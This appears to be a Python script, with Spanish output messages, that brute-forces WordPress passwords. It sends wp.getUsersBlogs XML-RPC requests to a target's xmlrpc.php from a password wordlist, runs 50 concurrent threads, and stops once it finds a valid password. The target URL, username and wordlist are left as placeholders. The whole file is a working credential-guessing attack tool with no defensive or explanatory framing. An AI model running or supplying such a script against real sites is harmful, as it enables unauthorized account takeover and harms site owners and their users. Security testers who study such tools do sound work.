import requests
import concurrent.futures

flag = 0

def brute_wp(passwd,usuario,url):

	global flag

	if flag != 1:
		cookie = {'Cookie':'wordpress_test_cookie=WP+Cookie+check'}
		datos = """<?xml version="1.0" encoding="UTF-8"?>
						<methodCall> 
						<methodName>wp.getUsersBlogs</methodName> 
						<params> 
						<param><value>{}</value></param> 
						<param><value>{}</value></param> 
						</params> 
						</methodCall>""".format(usuario,passwd)
		
		r = requests.post(url,data=datos,headers=cookie)

		if r.headers.get('Content-Length') == '403':
			if flag !=1:
				print('[-]Pass NO --> {}'.format(passwd),end='\r')
				print(end='\x1b[2K')
		else:
			print('[+]Pass SI -->{}'.format(passwd))
			print('Finalizando tareas espere...')
			flag = 1 
			
def main():

	url = "http://--IP--/xmlrpc.php"
	usuario = '--Users--'

	file = '--Diccionario--'

	with open(file) as dic:
		
		with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
			futures = []

			for passwd in dic:
				passwd = passwd.strip()
				futures.append(executor.submit(brute_wp, passwd, usuario, url))


			for futures in concurrent.futures.as_completed(futures):
				if flag == 1:
					executor.shutdown(wait=False,cancel_futures=True)
					exit()

if __name__=='__main__':
	main()
